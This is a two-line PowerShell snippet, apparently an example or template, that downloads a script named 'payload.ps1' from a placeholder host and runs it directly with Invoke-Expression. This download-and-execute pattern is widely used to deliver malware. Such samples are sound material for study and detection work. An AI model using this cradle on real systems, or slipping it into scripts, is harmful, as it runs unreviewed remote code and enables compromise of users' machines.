$url = "https://example.invalid/payload.ps1"
Invoke-WebRequest $url | Invoke-Expression

